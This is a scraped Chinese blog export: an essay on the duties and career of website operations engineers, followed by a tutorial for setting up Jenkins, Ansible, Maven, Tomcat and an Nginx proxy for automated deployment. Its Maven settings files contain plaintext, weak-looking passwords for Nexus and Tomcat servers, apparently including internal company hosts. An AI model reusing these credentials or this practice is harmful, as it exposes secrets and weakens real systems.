应用的前期架构设计、软/硬件资源评估申请采购、应用设计性能隐患及评估、IDC、服务性能安全调优、服务器系统级优化（与特定应用有关）等都需运维全程参与，并主导整个应用上线项目；运维工程师负责产品服务器上架准备工作，服务器系统安装、网络、IP、通用工具集安装。运维工程师还需要对上线的应用系统架构是否合理、是否具备可扩展性、及安全隐患等因素负责，并负责最后将产品（程序）、网络、系统三者进行拼接并最优化的组合在一起，最终完成产品上线提供用户使用，并周而复使：需求-&gt;开发（升级）-&gt;测试-&gt;上线（性能、安全问题等之前预估外的问题随之慢慢就全出来了）在这里提一点：网站开发模式与传统软件开发完全不一样，网站一天开发上线1~5个升级版本是家常便饭，用户体验为王嘛，如果某个线上问题像M$需要1年解决，用户早跑光了；应用上线后，运维工作才刚开始，具体工作可能包括： 升级版本上线工作、服务监控、应用状态统计、日常服务状态巡检、突发故障处理、服务日常变更调整、集群管理、服务性能评估优化、数据库管理优化、随着应用PV增减进行应用架构的伸缩、安全、运维开发工作： 1234a 、尽量将日常机械性手工工作通过工具实现（如服务监控、应用状态统计、服务上线等等），提高效率。b、解决现实中服务存在的问题，如高可靠性、可扩展性问题等。c、大规模集群管理工具的开发，如1万台机器如何在1分钟内完成密码修改、或运行指定任务？2000台服务器如何快速安装操作系统？各分布式IDC、存储集群中数PT级的数据如何快速的存储、共享、分析？等一系列挑战都需运维工程师的努力。在此说明一下其它配合工种情况，在整个项目中，前端应用对于网络/系统工程师来说是黑匣子，同时开发工程师职责只是负责完成应用的功能性开发，并对应用本身性能、安全性等应用本身负责，它不负责或关心网络/系统架构方面事宜，当然软/硬件采购人员等事业部其它同事也不会关心这些问题，各司其职，但项目的核心是运维工程师~！所有其它部门的桥梁。 举例：上面说了很多，我想大家应该对运维有一些概念了，在此打个比方吧，如果我们是一辆高速行驶在高速公路上的汽车，那运维工程师就是司机兼维修工，这个司机不简单，有时需要在高速行驶过程中换轮胎、并根据道路情况换档位、当汽车速度越来越快，汽车本身不能满足高速度时对汽车性能调优或零件升级、高速行进中解决汽车故障及性能问题、时刻关注前方安全问题，并先知先觉的采取规避手段。这就是运维工作~！ 最后说一下运维工程师的职责：”确保线上稳定“，看似简单，但实属不容易，运维工程师必须在诸多不利因素中进行权衡：新产品模式对现有架构及技术的冲击、产品高频度的升级带来的线上BUG隐患、运维自动化管理承度不高导致的人为失误、IT行业追求的高效率导致流程执行上的缺失、用户增涨带来的性能及架构上的压力、IT行业宽松的技术管理文化、创新风险、互联网安全性问题等因素，都会是网站稳定的大敌，运维工程师必须把控好这最后一关，需具体高度的责任感、原则性及协调能力，如果能做到各因素的最佳平衡，那就是一名优秀的运维工程师了。 另外在此聊点题外话，我在这里看到有很多人要sina、QQ、baidu,51.com等聊自已的运维方面的经验，其实这对于它们有点免为其难： a、各公司自已网络架构、规模、或多或少还算是公司的核心秘密，要保密，另外，对于大家所熟知的通用软件、架构，由于很多公司会根据自已实际业务需要，同时因为原版性能、安全性、已知bug、功能等原因，进行过二次开发（如apache,php,mysql），操作系统内核也会根据不同业务类型进行定制的，如某些应用属于运算型、某些是高IO型、或大存储大内存型。根据这些特点进行内核优化定制，如sina就在memcache上进行过二次开发，搞出了一个MemcacheDB，具体做得如何我们不谈，但开源了，是值得称赞的，国内公司对于开源基本上是索取，没有贡献；另外，服务器也不是大家所熟知的型号，根据业务特点，大部份都是找DELL/HP/ibm进行过定制；另外，在分布式储存方面都有自已解决方案，要不就是使用现成开源hadoop等解决方案，或自已开发。但90%都是借鉴google GFS的思想:分布式存储、计算、大表。 b、各公司业务方向不一样，会导致运维模式或方法都不一样，如51.com和baidu运维肯定区别很大，因为他们业务模式决定了其架构、服务器量级、IDC分布、网络结构、通用技术都会不一样，主打新闻门户的sina与主打sns的51.com运维模式差异就非常大,甚至职责都不大一样；但有一点，通用技术及大致架构上都大同小异，大家不要太神化，更多的公司只是玩垒积木的游戏罢了，没什么技术含量。 c、如上面所讲，目前大型网站运维还处于幼年时期理念和经验都比较零散，没有成熟的知识体系，可能具体什么是运维，大家都要先思索一番，或压根没想过，真正讨论也只是运维工作的冰山一角，局限于具体技术细节，或某某著名网站大的框架，真正运维体化东西没有，这也许是目前网上运维相关资料比较少的原故吧。或者也是国内运维人员比较难招，比较牛的运维工程师比较少见的原因之一吧。 二、运维工作师需要什么样的技能及素质做为一名运维工程师需要什么样的技能及素质呢，首先说说技能吧，如大家上面所看到，运维是一个集多IT工种技能与一身的岗位，对系统-&gt;网络-&gt;存储-&gt;协议-&gt;需求-&gt;开发-&gt;测试-&gt;安全等各环节都需要了解一些，但对于某些环节需熟悉甚至精通，如系统(基本操作系统的熟悉使用,*nix,windows..)、协议、系统开发(日常很重要的工作是自动运维化相关开发、大规模集群工具开发、管理）、通用应用（如lvs、ha、web server、db、中间件、存储等）、网络,IDC拓朴架构； 技能方面总结以下几点：1234561、开发能力，这点非常重要，因为运维工具都需要自已开发，开发语言：perl、python、php（其中之一）、shell（awk,sed,expect….等），需要有过实际项目开发经验，否则工作会非常痛苦。2、通用应用方面需要了解：操作系统（目前国内主要是linux、bsd）、webserver相关(nginx,apahe,php,lighttpd,java。。。)、数据库(mysql,oralce)、其它杂七八拉的东东；系统优化，高可靠性；这些只是加分项，不需必备，可以边工作边慢慢学，这些东西都不难。当然在运维中，有些是有分工偏重点不一样。3、系统、网络、安全，存储，CDN，DB等需要相当了解，知道其相关原理。 个人素质方面：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778791、沟通能力、团队协作：运维工作跨部门、跨工种工作很多，需善于沟通、并且团队协作能力要强；这应该是现代企业的基本素质要求了，不多说。2、工作中需胆大心细：胆大才能创新、不走寻常路，特别对于运维这种新的工种，更需创新才能促进发展；心细，运维工程师是网站admin,最高线上权限者，一不小心就会遗憾终生或打入十八层地狱。3、主动性、执行力、精力旺盛、抗压能力强：由于IT行业的特性，变化快；往往计划赶不上变化，运维工作就更突出了，比如国内各大公司服务器往往是全国各地，哪里便宜性价比高，就那往搬，进行大规模服务迁移（牵扯的服务器成百上千台），这是一个非常头痛的问题；往往时间非常紧迫，如限1周内完成，这种情况下，运维工程师的主动性及执行力就有很高的要求了：计划、方案、服务无缝迁移、机器搬迁上架、环境准备、安全评估、性能评估、基建、各关联部门扯皮,7X24小紧急事故响应等。4、其它就是一些基本素质了：头脑要灵光、逻辑思维能力强、为人谦虚稳重、亲和力、乐于助人、有大局观。5、最后一点，做网站运维需要有探索创新精神，通过创新型思维解决现实中的问题，因为这是一个处于幼年的职业（国外也一样，但比国内起步早点），没有成熟体系或方法论可以借鉴，只能靠大家自已摸索努力。三、怎样才算是一个合格的运维工程师1、保证服务达到要求的线上标准，如99.9%；保证线上稳定，这是运维工程师的基本责职所在。2、不断的提升应用的可靠性与健壮性、性能优化、安全提升；这方面非常考验主动性和创新思维。3、网站各层面监控、统计的覆盖度，软件、硬件、运行状态，能监控的都需要监控统计，避免监控死角、并能实时了解应用的运转情况。4、通过创新思维解决运维效率问题；目前各公司大部份运维主要工作还是依赖人工操作干预，需要尽可能的解放双手。5、运维知识的积累与沉淀、文档的完备性，运维是一个经验性非常强的岗位，好的经验与陷阱都需积累下来，避免重复性范错。6、计划性和执行力；工作有计划，计划后想法设法达到目标，不找借口。7、自动化运维；能对日常机械化工作进行提炼、设计并开发成工具、系统，能让系统自动完成的尽量依靠系统；让大家更多的时间用于思考、创新思维、做自已喜欢的事情。以上只是技术上的一些层面，当然个人意识也是很重要的。四、运维职业的迷惘、现状与发展前景运维岗位不像其它岗位，如研发工程师、测试工程师等，有非常明确的职责定位及职业规划，比较有职业认同感与成就感；而运维工作可能给人的感觉是哪方面都了解一些，但又都比上专职工程师更精通、感觉平时被关注度比较低（除非线上出现故障），慢慢的大家就会迷惘，对职业发展产生困惑,为什么会有这种现象呢？除了职业本身特点外，主要还是因为对运维了解不深入、做得不深入导致；其实这个问题其它岗位也会出现，但我发现运维更典型，更容易出现这个问题；针对这个问题我谈一下网站运维的现状及发展前景（也在思考中，可能不太深入全面，也请大家斧正补充）运维现状：1、处于刚起步的初级阶段，各大公司有此专职，但重视或重要程度不高，可替代性强；小公司更多是由其它岗位来兼顾做这一块工作，没有专职，也不可能做得深入。2、技术层次比较低；主要处于技术探索、积累阶段，没有型成体系化的理念、技术。3、体力劳动偏大；这个问题主要与第二点有关系，很多事情还是依靠人力进行，没有完成好的提练，对于大规模集群没有成熟的自动化管理方法，在此说明一下，大规模集群与运维工作是息息相关的如果只是百十来台机器，那就没有运维太大的生存空间了。4、优秀运维人才的极度缺乏；目前各大公司基本上都靠自已培养，这个现状导致行业内运维人才的流动性非常低，非常多好的技术都局限在各大公司内部，如 google 50万台机器科学的管理,或者国内互联公司top 10的一些运维经验，这些经验是非常有价值的东西并决定了一个公司的核心竞争力；这些问题进而导致业内先进运维技术的流通、贯通、与借签，并最终将限制了运维发展。5、很多优秀的运维经验都掌握在大公司手中；这不在于公司的技术实力，而在于大公司的技术规模、海量PV、硬件规模足够大，如baidu可怕的流量、 51.com海量数据~~~~这些因素决定了他们遇到的问题都是其它中/小公司还没有遇到的，或即将遇到。但大公司可能已有很好的解决方案或系统。发展前景：1、从行业角度来看，随着中国互联网的高速发展（目前中国网民已跃升为全球第一）、网站规模越来越来大、架构越来越复杂；对专职网站运维工程师、网站架构师的要求会越来越急迫,特别是对有经验的优秀运维人才需求量大，而且是越老越值钱；目前国内基本上都是选择毕业生培养（限于大公司），培养成本高，而且没有经验人才加入会导致公司技术更新缓慢、影响公司的技术发展；当然，毕业生也有好处：白纸一张，可塑性强，比较认同并容易融入企业文化。2、从个人角度，运维工程师技术含量及要求会越来越高，同时也是对公司应用、架构最了解最熟悉的人、越来越得到重视。3、网站运维将成为一个融合多学科（网络、系统、开发、安全、应用架构、存储等）的综合性技术岗位，给大家提供一个很好的个人能力与技术广度的发展空间。4、运维工作的相关经验将会变得非常重要，而且也将成为个人的核心竞争力，具备很好的各层面问题的解决能力及方案提供、全局思考能力等。5、特长发挥和兴趣的培养；由于运维岗位所接触的知识面非常广阔，更容易培养或发挥出个人某些方面的特长或爱好，如内核、网络、开发、数据库等方面，可以做得非常深入精通、成为这方面的专家。6、如果真要以后不想做运维了，转到其它岗位也比较容易，不会有太大的局限性。当然了，你得真正用心去做。7、技术发展方向：网站/系统架构师。五、运维关键技术点解剖1、 大规模集群管理问题首先我们先要明确集群的概念，集群不是泛指各功能服务器的总合，而是指为了达到某一目的或功能的服务器、硬盘资源的整合（机器数大于两台），对于应用来说它就是一个整体，目前常规集群可分为：高可用性集群（HA），负载均衡集群（如lvs），分布式储、计算存储集群（DFS，如google gfs,yahoohadoop），特定应用集群（某一特定功能服务器组合、如db、cache层等），目前互联网行业主要基于这四种类型；对于前两种类似，如果业务简单、应用上post操作比较少，可以简单的采用四层交换机解决（如f5），达到服务高可用/负责均衡的作用，对于资源紧张的公司也有一些开源解决办法如lvs+ha,非常灵活；对于后两种，那就考验公司技术实力及应用特点了，第三种DFS主要应用于海量数据应用上，如邮件、搜索等应用，特别是搜索要求就更高了，除了简单海量存储，还包括数据挖掘、用户行为分析；如google、yahoo就能保存分析近一年的用户记录数据，而baidu应该少于30天、soguo就更少了。。。这些对于搜索准备性、及用户体验是至关重要的。接下来，我们再谈谈如何科学的管理集群，有以下关键几点：I、监控主要包括故障监控和性能、流量、负载等状态监控，这些监控关系到集群的健康运行，及潜在问题的及时发现与干预；a、服务故障、状态监控：主要是对服务器自身、上层应用、关联服务数据交互监控；例如针对前端webserver，我们就可以有很多种类型的监控，包括应用端口状态监控，便于及时发现服务器或应用本身是否crash、通过icmp包探测服务器健康状态，更上层可能还包括应用各频道业务的监控，常用方法是采用面业特征码进行判断，或对重点页面进行签名，以网站被黑篡改（报警、并自动恢复被篡改数据）等等，这些只是一部份，还有N多监控方式，依应用特点而定，还有一些问题需解决，如集群过大，如何高性能的进行监控也是一个现实问题。b、其它就是集群状态类的监控或统计，为我们合理管理调优集群提供数据参考、包括服务瓶颈、性能问题、异常流量、攻击等问题。II、故障管理a、硬件故障问题；对于成百上千或上万机器的N多集群，服务器死机、硬件故障概率是非常大的，几乎每时每刻都有服务硬件问题，死机、硬盘损坏、电源、内存、交换机。针对这种情况，我们在设计网站架构时需要充分考虑到这些问题，并将其视为常态；更多的依靠应用的冗余机制来规避这种风险，但给系统工程师足够宽裕的处理时间。（如google不是号称同时死800台机器，服务不会受到任何影响吗）；这就是考验运维工程师及网站架构师功能的地方了，好的设计能达到google所描述自恢复能力，如gfs，糟糕的设计那就是一台服务器的死机可能会造成大面积服务的连锁故障反映，直接对用户拒绝响应。b、应用故障问题；可能是某一bug被触发、或某一性能阀值被超越、攻击等情况不一而定，但重要的一点，是要有对这些问题的预防性措施，不能想当然，它不会出问题，如真出问题了，如何应对？这需要运维工程师平时做足功夫，包括应急响应速度、故障处理的科学性、备用方案的有效等。III、自动化自动化：简而言之，就是将我们日常手动进行的一些工作通过工具，系统自动来完成，解放我们的双手及枯燥的重复性劳动，例如：没有工具前，我们安装系统需要一台一台裸机安装，如2000台，可能需要10人/10天，搞烂N张光盘，人力成本更大。。。而现在通过自动化工具，只需几个简单命令就能搞定、还有如机器人类程序，自动完成以往每天人工干预的工作，使其自动完成、汇报结果，并具备一定的专家系统能力，能做一些简单的是/非判断、优化选择等。。。这些好处非常明显不再多说。。。应该说，自动化运维是运维工程师职业化的一个追求，利已利公，虽然这是一个异常艰巨的任务：不断变更的业务、不规范化的应用设计、开发模式、网络架构变更、IDC变更、规范变动等因素，都可能会对现有自动化系统产生影响，所以需要模块化、接口化、变因参数化等因此，自动化相关工作，是运维工程师的核心重点工作之一，也是价值的体现。","raw":null,"content":null,"categories":[{"name":"运维笔记","slug":"运维笔记","permalink":"http://blog.yangcvo.me/categories/运维笔记/"}],"tags":[]},{"title":"Ansible + Jenkins+Maven＋Nginx搞定自动发布，构建程序的持续集成平台","slug":"自动化+可视化/Jenkins/用Ansible + Jenkins+maven＋nginx搞定自动发布，构建程序的持续集成平台","date":"2016-09-12T05:47:27.000Z","updated":"2017-05-02T09:30:16.000Z","comments":true,"path":"2016/09/12/自动化+可视化/Jenkins/用Ansible + Jenkins+maven＋nginx搞定自动发布，构建程序的持续集成平台/","link":"","permalink":"http://blog.yangcvo.me/2016/09/12/自动化+可视化/Jenkins/用Ansible + Jenkins+maven＋nginx搞定自动发布，构建程序的持续集成平台/","excerpt":"","text":"Ansible+Jenkins搞定自动发布，构建程序的持续集成平台Ansible是相对简单的批量管理工具，支持模板管理等高级功能。搞定了自动发布，开发的服务器需求已经明显下降，只要把代码提交到 Git主干，就会自动触发发布。 今天有空就简单记录下用Ansible + Jenkins搞定自动发布 。这篇是主要环境安装。 一、什么是持续集成1、什么是集成 指的是代码由编译、发布和测试、直到上线的一个过程 2、什么持续集成 高效的、持续性质的不断迭代代码的集成工作 3、如何高效准确的实现持续集成 必不可少的需要一套能自动化、并且可视化的平台来帮助我们。 那么总结来看，Jenkins就是一个可以帮助我们实现持续集成的平台。 二、为什么Jenkins能帮助我们进行持续集成 理由有如下几点： 1、Jenkins是一个开源的、且基于JAVA代码开发的持续集成系统。 因为含有非常丰富的插件支持所以我们可以方便的打通版本库、测试构建环境、线上环境的所有环节。并且丰富友好的通知使用者和开发、管理人员。 2、安装维护简单 安装Jenkins，不太复杂。且支持通用的平台。 3、Java 应用 常用 在企业的软件构建过程中，JAVA的应用工程稍显复杂，由于复杂构建、和代码上线、并且服务的重启。整个过程下来，消耗的时间较多，Jenkins却能很好的集成maven的编译方式，且利用自动化的插件、和自定义开发脚本的支持。所以目前广泛的应用于JAVA工程的持续集成平台。 好了，那么接下来我就来介绍，如何搭建一套快速有效的Jenkins自动化发布持续集成平台。 前言为了提高工作效率，避免重复的手动发包部署工作，特搭建Jenkins+Ansible的自动部署平台。主要实现原理是： 由Jenkins拉取git代码 使用Maven命令编译打包 通过Ansible 发送war包到对应的服务器 通过Ansible执行远程服务器的重启命令 发布完成。 一. 环境介绍本平台搭建在CentOS6环境中，其他linux环境情况类似。在自动部署服务器中需要安装以下软件： JDK Git Maven Tomcat Jenkins Ansible 二. 步骤： ansible安装与配置； Jenkins的安装； Jenkins的配置； 安装配置tomcat 安装配置Java； 安装配置maven； nginx反向代理配置访问域名； 相关插件安装； 系统设置明细； slave节点配置； 一些依赖项的安装。 1.1 Ansible简单介绍Ansible是一个部署一群远程主机的工具。远程的主机可以是本地或者远程的虚拟 机，也可以是远程的物理机。Ansible通过SSH协议进行管理节点和远程节点之间的通信。理论上说管理员通过 ssh到一台远程主机上能做的操作Ansible都可以做。包括：拷贝文件、安装包、启动服务… 总结：Ansible把一些shell命令封装成一个个模块，并通过SSH连接，在远程机器上执行这些模块包含的脚本。 1.2 Ansible安装与配置系统环境：centos7.1直接使用yum安装ansible 12# yum install http://mirrors.sohu.com/fedora-epel/6/x86_64/epel-release-6-8.noarch.rpm# yum install ansible 安装完成之后，需要ansible中的hosts文件分组，编辑/etc/ansible/hosts文件，将目标机器加入分组，并配置好面秘钥登录。Ansible更多详细内容可以参考我之前写的ansibles学习篇 二. 安装Jenkins环境1) 安装并配置好JAVA、JDK、Tomcat，并去官网下载最新版本的war包。 去官网下载包资源： 1234apache-tomcat-8.0.28.tar.gzjenkins.warjdk1.8.0_66.tar.gzmaven.tar.gz 没有下载成功的我这里已下载好了。最新版本jenkins.wartomcat.tar.gzmaven.tar.gz 2.1 jdk安装：12345678910111213tar -zxvf jdk1.8.0_66.tar.gz -C /srv/. 这里在配置环境变量。vim /etc/profile.d/java.shexport JAVA_HOME=/srv/jdk1.8.0_66export CLASS_PATH=\"$JAVA_HOME/lib:$JAVA_HOME/jre/lib\"export PATH=$PATH:$JAVA_HOME/bin[root@Jenkins ~]# java -versionjava version \"1.8.0_66\"Java(TM) SE Runtime Environment (build 1.8.0_66-b17)Java HotSpot(TM) 64-Bit Server VM (build 25.66-b17, mixed mode) 2.2 Tomcat安装配置：Jenkins官网：https://jenkins.io/index.html可参考我之前写的文档：搭建配置tomcat环境 1234tar -zxvf apache-tomcat-8.0.28.tar.gz -C /srv/.mv apache-tomcat-8.0.28 tomcatuseradd -s /sbin/nologin tomcat chown -R tomcat:tomcat tomcat 2) 放在配置好Tomcat，启动Jenkins，根据提示，输入安装秘钥。 2.3 jenkins安装配置：12345mv jenkins.war /srv/tomcat/webapps/. cd /tomcat./bin/startup.sh然后打开地址：http://192.168.1.183:8080/jenkins新版本会提示下载安装插件。下载以后会让你设置账号和密码还有邮箱。 进入安装界面:第一次，登录，需要进行一个解锁 ，页面也会有提示. 秘钥的具体位置在：/root/.jenkins/secrets/initialAdminPassword中，我们可以通过这个文件中查看密码，并输入。 3) 设置好登录账号密码，根据推荐选项安装插件，等待下载安装完成。在插件安装过程中可能有些安装不成功，暂时先不用管。 它会给我们安装一些基础的插件早期jenkins默认是不需要登陆的。 1.3 Maven 安装和配置官网：http://maven.apache.org/官网下载：http://maven.apache.org/download.cgi历史版本下载：https://archive.apache.org/dist/maven/binaries/此时（20160208） Maven 最新版本为：3.3.9 Maven 3.3 的 JDK 最低要求是 JDK 1.7 - 我个人习惯 /opt 目录下创建一个目录 setups 用来存放各种软件安装包；在 /srv 目录下创建一个 program 用来存放各种解压后的软件包，下面的讲解也都是基于此习惯. 下载压缩包：wget http://mirrors.cnnic.cn/apache/maven/maven-3/3.3.9/binaries/apache-maven-3.3.9-bin.tar.gz解压指定到我个人习惯的安装目录下：tar zxvf apache-maven-3.3.9-bin.tar.gz -C /srv/program/.移到我个人习惯的安装目录下：mv maven3.3.9/ /srv/program/maven3 12345678环境变量设置：vim /etc/profile.d/maven.sh # Maven MAVEN_HOME=/srv/program/maven3 PATH=$PATH:$MAVEN_HOME/bin MAVEN_OPTS=\"-Xms256m -Xmx356m\" export MAVEN_HOME export PATH export MAVEN_OPTS 刷新配置文件：source /etc/profile测试是否安装成功：mvn -version 1.3.1 Maven 配置 配置项目连接上私服 全局方式配置： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;settings xmlns=\"http://maven.apache.org/SETTINGS/1.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/SETTINGS/1.0.0 http://maven.apache.org/xsd/settings-1.0.0.xsd\"&gt; &lt;!--本地仓库位置--&gt; &lt;localRepository&gt;/srv/mv2&lt;/localRepository&gt; &lt;pluginGroups&gt; &lt;/pluginGroups&gt; &lt;proxies&gt; &lt;/proxies&gt; &lt;!--设置 Nexus 认证信息--&gt; &lt;servers&gt; &lt;server&gt; &lt;id&gt;nexus-releases&lt;/id&gt; &lt;username&gt;admin&lt;/username&gt; &lt;password&gt;admin123&lt;/password&gt; &lt;/server&gt; &lt;server&gt; &lt;id&gt;nexus-snapshots&lt;/id&gt; &lt;username&gt;admin&lt;/username&gt; &lt;password&gt;admin123&lt;/password&gt; &lt;/server&gt; &lt;/servers&gt; &lt;!--设置 Nexus 镜像，后面只要本地没对应的以来，则到 Nexus 去找--&gt; &lt;mirrors&gt; &lt;mirror&gt; &lt;id&gt;nexus-releases&lt;/id&gt; &lt;mirrorOf&gt;*&lt;/mirrorOf&gt; &lt;url&gt;http://localhost:8081/nexus/content/groups/public&lt;/url&gt; &lt;/mirror&gt; &lt;mirror&gt; &lt;id&gt;nexus-snapshots&lt;/id&gt; &lt;mirrorOf&gt;*&lt;/mirrorOf&gt; &lt;url&gt;http://localhost:8081/nexus/content/groups/public-snapshots&lt;/url&gt; &lt;/mirror&gt; &lt;/mirrors&gt; &lt;profiles&gt; &lt;profile&gt; &lt;id&gt;nexus&lt;/id&gt; &lt;repositories&gt; &lt;repository&gt; &lt;id&gt;nexus-releases&lt;/id&gt; &lt;url&gt;http://nexus-releases&lt;/url&gt; &lt;releases&gt; &lt;enabled&gt;true&lt;/enabled&gt; &lt;/releases&gt; &lt;snapshots&gt; &lt;enabled&gt;true&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt; &lt;repository&gt; &lt;id&gt;nexus-snapshots&lt;/id&gt; &lt;url&gt;http://nexus-snapshots&lt;/url&gt; &lt;releases&gt; &lt;enabled&gt;true&lt;/enabled&gt; &lt;/releases&gt; &lt;snapshots&gt; &lt;enabled&gt;true&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt; &lt;/repositories&gt; &lt;pluginRepositories&gt; &lt;pluginRepository&gt; &lt;id&gt;nexus-releases&lt;/id&gt; &lt;url&gt;http://nexus-releases&lt;/url&gt; &lt;releases&gt; &lt;enabled&gt;true&lt;/enabled&gt; &lt;/releases&gt; &lt;snapshots&gt; &lt;enabled&gt;true&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/pluginRepository&gt; &lt;pluginRepository&gt; &lt;id&gt;nexus-snapshots&lt;/id&gt; &lt;url&gt;http://nexus-snapshots&lt;/url&gt; &lt;releases&gt; &lt;enabled&gt;true&lt;/enabled&gt; &lt;/releases&gt; &lt;snapshots&gt; &lt;enabled&gt;true&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/pluginRepository&gt; &lt;/pluginRepositories&gt; &lt;/profile&gt; &lt;/profiles&gt; &lt;activeProfiles&gt; &lt;activeProfile&gt;nexus&lt;/activeProfile&gt; &lt;/activeProfiles&gt;&lt;/settings&gt; jenkins发布修改过以后： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596&lt;settings xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/settings-1.0.0.xsd\"&gt; &lt;!--表示本地库的保存位置，也就是maven2主要的jar保存位置，默认在$&#123;user.dir&#125;/.m2/repository，如果需要另外设置，就换成其他的路径。 --&gt; &lt;localRepository&gt;/srv/m2&lt;/localRepository&gt; &lt;interactiveMode/&gt; &lt;usePluginRegistry/&gt; &lt;offline&gt;false&lt;/offline&gt; &lt;!--当插件的组织Id（groupId）没有显式提供时，供搜寻插件组织Id（groupId）的列表。该元素包含一个pluginGroup元素列表，每个子元素包含了一个组织Id（groupId）。当我们使用某个插件，并且没有在命令行为其提供组织Id（groupId）的时候，Maven就会使用该列表。默认情况下该列表包含了org.apache.maven.plugins。 --&gt; &lt;pluginGroups&gt; &lt;!--plugin的组织Id（groupId） --&gt; &lt;pluginGroup&gt;org.codehaus.mojo&lt;/pluginGroup&gt;&lt;pluginGroup&gt;org.apache.tomcat.maven&lt;/pluginGroup&gt;&lt;pluginGroup&gt;org.mortbay.jetty&lt;/pluginGroup&gt; &lt;/pluginGroups&gt; &lt;servers&gt; &lt;server&gt; &lt;id&gt;tomcat&lt;/id&gt; &lt;username&gt;tomcat&lt;/username&gt; &lt;password&gt;keyfree123&lt;/password&gt; &lt;/server&gt; &lt;server&gt; &lt;id&gt;haozhuo&lt;/id&gt; &lt;username&gt;haozhuo&lt;/username&gt; &lt;password&gt;haozhuo123&lt;/password&gt; &lt;/server&gt; &lt;!--d:server 的id,用于匹配distributionManagement库id，比较重要。 --&gt; &lt;server&gt; &lt;id&gt;nexus-releases&lt;/id&gt; &lt;!--username, password:用于登陆此服务器的用户名和密码 --&gt; &lt;username&gt;admin&lt;/username&gt; &lt;password&gt;123456&lt;/password&gt; &lt;/server&gt; &lt;server&gt; &lt;id&gt;nexus-snapshots&lt;/id&gt; &lt;username&gt;admin&lt;/username&gt; &lt;password&gt;123456&lt;/password&gt; &lt;/server&gt; &lt;/servers&gt; &lt;mirrors&gt; &lt;!--表示镜像库，指定库的镜像，用于增加其他库 --&gt; &lt;mirror&gt; &lt;id&gt;nexus-aliyun&lt;/id&gt; &lt;mirrorOf&gt;*&lt;/mirrorOf&gt; &lt;name&gt;Nexus aliyun&lt;/name&gt; &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public&lt;/url&gt; &lt;/mirror&gt; &lt;mirror&gt; &lt;id&gt;hz&lt;/id&gt; &lt;name&gt;hz Central&lt;/name&gt; &lt;url&gt;http://nexus.haozhuo.com:8083/nexus/content/groups/public/&lt;/url&gt; &lt;mirrorOf&gt;central&lt;/mirrorOf&gt; &lt;/mirror&gt; &lt;mirror&gt; &lt;id&gt;CN&lt;/id&gt; &lt;name&gt;OSChina Central&lt;/name&gt; &lt;url&gt;http://maven.oschina.net/content/groups/public/&lt;/url&gt; &lt;mirrorOf&gt;central&lt;/mirrorOf&gt; &lt;/mirror&gt; &lt;mirror&gt; &lt;id&gt;ibiblio.org&lt;/id&gt; &lt;name&gt;ibiblio Mirror of http://repo1.maven.org/maven2/&lt;/name&gt; &lt;url&gt;http://mirrors.ibiblio.org/pub/mirrors/maven2&lt;/url&gt; &lt;mirrorOf&gt;central&lt;/mirrorOf&gt; &lt;/mirror&gt; &lt;!-- &lt;mirror&gt; &lt;id&gt;jboss-public-repository-group&lt;/id&gt; &lt;mirrorOf&gt;central&lt;/mirrorOf&gt; &lt;name&gt;JBoss Public Repository Group&lt;/name&gt; &lt;url&gt;http://repository.jboss.org/nexus/content/groups/public&lt;/url&gt; &lt;/mirror&gt; --&gt; &lt;/mirrors&gt; &lt;activeProfiles&gt; &lt;!--make the profile active all the time --&gt; &lt;!--&lt;activeProfile&gt;nexus&lt;/activeProfile&gt; --&gt; &lt;/activeProfiles&gt;&lt;/settings&gt; 三. 配置nginx反向代理.在nginx配置目录/usr/local/nginx/conf/nginx.conf，配置文件内容如下 1234567891011121314151617upstream tomcat-jenkins &#123; server 192.168.1.220:8080 weight=1; &#125; server &#123; listen 80; server_name jenkins.yjk.cn; location / &#123; index index.html index.php index.jsp index.htm; proxy_pass http://tomcat-jenkins; proxy_ignore_client_abort on; proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125; &#125; 修改/etc/hosts，在末尾新增一行 : 1127.0.0.1 jenkins.yjk.cn 重启nginx，/usr/sbin/nginx -s reload，即可以地址 jenkins.yjk.cn 访问Jenkins主页. 四. 安装部分Jenkins插件访问Jenkins主页：http://jenkins.yjk.cn系统管理 –&gt; 管理插件 –&gt; 可选插件;安装所需要的插件(根据需要自行选择)，如 GitBucket Plugin、 FindBugs Plug-in 、Cobertura Plugin 、 Violations Plugin 、Email Extension Plugin等 ⚠️插件安装不成功处理办法： 进入左侧菜单栏的系统管理，发现很多插件无法安装成功，如下图： 复制安装失败的名称，点击右侧按钮，选择可选插件，输入名称重新安装。 如果还是失败，请注意提示信息，可直接下载该插件手动上传安装，手动下载该插件，在插件管理的高级标签中，选择上传安装。 如果上传失败，还有个方法：直接把下载下来的插件上传到Jenkins服务器上面。默认安装的话目录在：/root/.jenkins/plugins/ 重启服务即可. 五. 系统设置以及介绍（可跳过）1.1 系统配置进入首页系统管理—&gt;系统设置。 配置maven 配置邮件服务 主目录默认在 /root/.jenkins 下面，此目录保存jenkins 的所有配置和插件等，具体可以于服务器中查看该目录。下面可以继续配置maven，jdk，git等等，也可以使用默认的配置。 1.2 项目配置新建一个自由风格的项目，输入项目名称。 1.参数配置 简单的从Git中拉取代码无法满足我们的需求，最理想的状态是可以对发布的分支进行动态选择。所以我们需要安装一个配置动态参数的插件：Dynamic Parameter Plug-in 安装好插件之后，在项目配置，参数化构建过程中添加动态参数： 输入变量名称和脚本，在接下来的配置中就可以使用$Name的方式，使用变量了。如：$branch。 12def gettags = (\"git ls-remote -h git@gitlab.ihaozhuo.com:Java_Service/YJK-Java.git\").execute() gettags.text.readLines().collect &#123; 